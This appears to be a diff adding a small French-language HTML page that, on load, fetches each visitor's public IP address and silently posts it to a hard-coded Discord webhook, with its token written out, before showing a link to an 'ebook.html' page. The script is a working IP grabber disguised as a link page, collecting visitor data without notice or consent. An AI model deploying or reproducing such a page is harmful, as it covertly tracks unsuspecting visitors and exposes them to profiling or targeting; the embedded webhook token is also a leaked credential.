@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Envoyer IP à Discord</title>
+</head>
+<body>
+    <h2>Envoyer IP à Discord</h2>
+
+    <script>
+        // Récupérer l'adresse IP du visiteur (côté client)
+        fetch('https://api64.ipify.org?format=json')
+            .then(response => response.json())
+            .then(data => {
+                const ipAddress = data.ip;
+
+                // URL du webhook Discord
+                const webhookUrl = "https://discord.com/api/webhooks/1185641580439285831/2DsSvaHgA0dPYZUuhO0JdlSQ3tOV0zgW7FdU89ujLe1w2HkiJ7Rv1UfwrGcm-BxN6hb6"; // Remplacez cela par votre URL de webhook
+
+                // Message à envoyer
+                const message = "Nouvelle connexion depuis l'adresse IP : " + ipAddress;
+
+                // Créer un objet de données à envoyer au webhook
+                const postData = {
+                    content: message
+                };
+
+                // Utiliser l'API Fetch pour envoyer la requête au webhook
+                fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(postData),
+                })
+                .then(response => response.json())
+                .then(data => console.log(data))
+                .catch(error => console.error('Erreur lors de l\'envoi à Discord :', error));
+
+                // Afficher le lien vers la page HTML dans un paragraphe
+                const linkParagraph = document.createElement('p');
+                linkParagraph.innerHTML = `<a href="ebook.html" target="_blank">Votre lien vers la page HTML</a>`;
+                document.body.appendChild(linkParagraph);
+            })
+            .catch(error => console.error('Erreur lors de la récupération de l\'adresse IP :', error));
+    </script>
+</body>
+</html>
